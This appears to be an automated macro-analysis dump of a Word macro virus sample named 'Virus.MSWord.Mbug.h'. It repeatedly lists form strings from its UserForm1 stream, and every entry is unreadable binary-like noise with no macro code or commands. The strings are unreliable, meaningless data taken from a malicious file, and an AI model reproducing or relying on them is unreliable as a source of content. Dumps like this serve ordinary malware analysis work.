!)!)'&D>FXcRkcckcck[ZlZKUJJR[Zl[ZlcccJJR1991)B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n!1k&-�~��~��xw�JJZB9J99J1)B'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B999<.<B9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGJBBJBBOGGJBBJBBJBBJBB99J1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B1)B99JBBRJJRB9B999=-1))!3.+3#)3#)3#);+;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
93=T^Rc1)B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)B9)9JJRcRk^Rc^Rc^Rc>FXPZmZKUcRk99J..9)%9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c+)�1E�ew�~��fs�99J99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)1)B1)B9999)9B9BB9BB9BB9BJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGJBBJBBJBBJBBJBBJBBJBB99J9)91-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J?9WJJRBBRB9B9)9999=-13#)3#)3#))!)3.+5%+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99FcZKUB9B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%999JJJR^RcJJRPZmJJRJJRJJRJJRJJR9)9..9)%9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`9I�TZ�iu�ew�3=T<.<1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B9)9B9BJBBB9BJBBJBBJBBJBBJBBJBBOGGJBBJBBOGGOGGJBBOGGOGGOGGOGGJBBJBBJBBB9BB9B3.D##X)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9)%91)B99119JB9JJJRJBJB9B<.<B9B9)9=-13.+3#)3#)3#)3#)5%+���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JBBRJBB3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2199JBJJJZJJRNPTJJRJJZJJRBBR99JB9J3.D)!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N)5k9L�N]�ew�]i�1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B9)9<.<B9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGJBBJBBOGGOGGJBBJBBJBBB9B99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%91)B99JBBRBBRJ9RJBBJBBJBB9)99)9999=-13#))!)3.+3#)3.+5%+���

+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!NBBRBFF9)9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)')-99JBBR3=TNPTJJRJJZ99J99J3#)1)B)%93#))%9)%9)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z99{DL�Xe�Xe�BMk1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BB9BB9BB9BJBBB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGJBBJBBJBBB9B99J1)B'&D!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%9)%93=TBBR19J99J1)BB9BJBBJBBB9BB9BB9B999=-13#)3.+3#)3#)3#)?/3���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJBJ[ZlJBB991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1)B1)BJBBJBJJJRBBRBBR1)B1)B3.+$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%9)%9)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)3#)=-13#)3#)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`)5sDL�TZ�LY�)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B9)999JJBBJBBJBBJBBB9BJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGJBBJBBJBBJBBB9B99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!))%91)B1)B?9W3=T1-X'1Y1)B3.D9)9B9JJBBJBBF-=9999)99993#)3#))!)=-11%1?/3���

+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)BJ9RiiqcccJ9J1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%99)9BBRJJRJJRBBRB9J99J')-)!)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)!))%9)%9)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!=-13#)=-11%13#)3#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z##X##X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N%-sDL�1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B<.<B9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGJBBJBBJBBJBBJBBJBBJBB99J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)BBBR>FX19J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99J99JJBBJBBJBBB9B9)99999993.+3.+3#)3.+1%1?/3���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X3.DJJRkVck^gk^gJJRJ9JJBJB9B999B9JBBRJJRJ9RB9J1)B991)!)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3#)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.+)!))!))!)')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!<.<991=-1=-13.+1%13#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N'1Y%)o#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B1)B3.D9)9B9JB9BB9BJBBJBBJBBJBBB9BJBBJBBJBBJBBJBBOGGOGGOGGJBBJBBJBBJBBJBBJBBJBBB9B99J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))%91)B99J99J3=T#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J9)9JBBJBBJBBB9B999999=-13#)3#)))!=-13#)>0>���

+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J)%93.D99JB9BJJReYVk^giiqcZkkVcPZmJJRJBB99J199)%91)B1)B<.<3.DB9B1993#))%9')-)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)9)99)9999F-==-1=-13#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)BB9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBB9B99J1)B'&D)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J19J3=T1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D99JB9BB9BJBBJBBB9BB9B9)93.+3.+9)93#)=-13#)?/3���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1-X1)BB9BB9BJBBJBBJ9ROGGZKUZKUZKUJJROGGB9BJBBOGGJBBJJZJJRNPTJ9J99J1)B3.+$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B9BJBBJ99B9B9)9F-==-13#)')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B9)9RBBB9BB9BJBBJBBJBBB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBB9B99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99JJ9RB9BJBBB9BB9BB9B999=-13#)3#)=-11%1=-1;+;���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B3.DB9JB9BJBBJBBJBBJBBJJROGGOGGJBBOGGOGGOGGOGGOGGJBBOGGJJROGGNPTJJRB9J199)%93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J99RBJJBBJBBJBBF-=BB9=-13#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.DB9B9)9JBBB9BJBBJBBB9BJBBJBBJBBJBBJBBJBBJBBOGGOGGJBBJBBJBBJBBJBBJBBB9BJBBB9B1)B1)B'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JJBBB9BJBBB9B999999=-13.+3#)=-13.+1%1;;;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B9)9B9BJBBJBBJBBJBBJBBJBBOGGJBBOGGJBBJBBOGGOGGOGGOGGZKUOGGOGGNPTeYVJJRJJRBBR9)9..9)%93.+)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9OGGJBBJBBJBBJBBJBB9)93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z.3~##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!91)B3.DB9BJ9R999B9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGJBBJBBJBBJBBJBBJBBB9BJBBB9B99J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BB9BJBBJBBB9B9)9999=-13#)3#)3#)<.<999;;;���

+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B1)BB9BB9BRBJJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGJBBOGGOGGRBBOGGJBBOGGOGGOGGBBRPZmkVcJJZ3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=-1ZKUJ99OGGJBBJ99JBBJBB9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X%)o.D�1E�K[�)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.D<.<B9BB9BB9BB9BJBBB9BJBBJBBJBBJBBJBBJBBOGGJBBOGGOGGJBBJBBJBBJBBJBBJBBJBBB9B99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BJBBJBBJBBJBB9)9999<.<=-13#)3.+=-13#);;;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JJ9R999JBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGRBB<<?OGGOGGJBBJBBBBRJJRt_�ZKUB9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)eYVR9BRBBJBBJ99OGGJBB3#)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^.3~!1k.D�9I�FV�Xe�iu�dt�5:k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B<.<B9BB9BB9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGJBBJBBJBBJBBJBBB9BJBBB9B99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)BB/V99JJBBJBBJBBB9B9)9=-13.+1%1=-13#)=-1999;;;���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B1)B<.<B9BJBBJBBB9BJBBJBBRBJOGGOGGOGGOGGZKUJBBOGGOGGZKUOGGRBBRBBOGGOGGOGGRBB?9W99JBBR^RcZKU991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ZKUkVcZKUR9BRBBJBBRBB1)B$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N!1k+)�.D�1E�9L�DL�N]�ew�~��~��ew�LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B3.D<.<<.<B9BB9BJBBB9BJBBJBBJBBJBBJBBJBBJBBOGGOGGZKURBBJBBJBBJBBJBBJBBJBBJBBB9B99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JJ9RJBBJBBJBBB9B9)99993#)3.+1%1<.<999999;;;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J1)BJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGZKUJBBRJJOGGOGGOGGOGGOGGOGGJBBJBBOGGJJRJBBB/V#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B/Viiqccc3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)ZKUeYVZKUZKUZKUR9BZKU999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c+)�.D�1E�DL�DL�N]�ew�ew�{{қ�Ǟ��~��ew�)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%91)B1)BB9BB9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGJBBOGGOGGJBBJBBJBBJBBJBBJBBB9BB9BB9B1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JJBBJBBJBBB9B999=-1=-13#)3#)<.<9999)9;+;���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B9)9B9JB9BB9BJBBJBBJBBJBBOGGOGGZKURBBJBJRJJOGGRJJOGGJBBOGGOGGOGGJBBOGGOGGBBRBBR1)B1)B##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=XFmeYV1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ZKUkVckVckVckVcZKUZKUJ9R
-------------------------------------------------------------------------------
